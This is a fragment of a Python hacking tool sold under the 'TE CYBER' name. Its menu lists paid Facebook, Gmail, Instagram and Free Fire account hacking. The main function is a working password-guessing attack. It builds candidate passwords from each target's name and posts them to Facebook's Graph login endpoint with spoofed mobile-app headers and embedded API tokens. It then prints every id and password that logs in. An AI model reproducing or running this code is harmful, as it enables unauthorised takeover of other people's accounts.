...
{A}──────────────────────────────────────────────────
{R}❲{A}={R}❳{G} OWNER    {R}:{G} TE CYBER
{R}❲{A}={R}❳{G} FACEBOOK {R}:{G} TE CYBER\_____:*\❷/3:)\⓿
{R}❲{A}={R}❳{G} TOOLTYPE {R}:{G} HACKING
{R}❲{A}={R}❳{G} STATUS   {R}:{G} PAID
{A}──────────────────────────────────────────────────"""
#__________________[ MENU ]__________________#
def menu():
    clear()
    print(f'{R}❲{A}0{R}❳{G} facebook hacking > 600')
    print(f'{R}❲{A}0{R}❳{G} Free Fire Hacking> 600') 
    print(f'{R}❲{A}0{R}❳{G} Gamil hacking > 600')
    print(f'{R}❲{A}0{R}❳{G} Free Fire Hacking> 600') 
    print(f'{R}❲{A}0{R}❳{G} Instagram hacking>600');linex()
...
def filex():
    clear()
    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} first payment ');linex()
...
def swag2(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': '[FBAN/FB4A;FBAV/293.0.0.43.120;FBBV/251953126;[FBAN/FB4A;FBAV/293.0.0.43.120;FBPN/com.facebook.katana;FBLC/en_AU;FBBV/251953126;FBCR/Internode Mobile;FBMF/Itel;FBBD/itel;FBDV/P9;FBSV/10.7.3;FBCA/x86:armeabi-v7a;FBDM/{density=4.0,width=862,height=1047};FB_FW/1;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print(f'\r\r{G}❲SWAG-OK❳ '+ids+'|'+pas)
